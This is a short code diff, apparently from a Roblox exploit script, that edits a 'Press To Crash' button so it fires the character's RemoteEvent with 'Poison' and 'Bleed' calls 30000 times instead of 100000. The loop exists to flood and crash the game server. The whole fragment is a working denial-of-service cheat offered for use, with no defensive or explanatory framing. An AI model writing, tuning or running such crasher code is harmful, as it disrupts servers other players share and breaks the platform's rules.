@@ -29,7 +29,7 @@ Crasher:AddButton({
 Crasher:AddButton({
 	Name = "Press To Crash",
 	Callback = function()
-      		for i = 1, 100000 do
+      		for i = 1, 30000 do
     		player.Character.RemoteEvent:FireServer("Poison", {Duration = 0.1, TotalDamage = 0.0001})
     		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 0.1, TotalDamage = 0.0001})
 			end
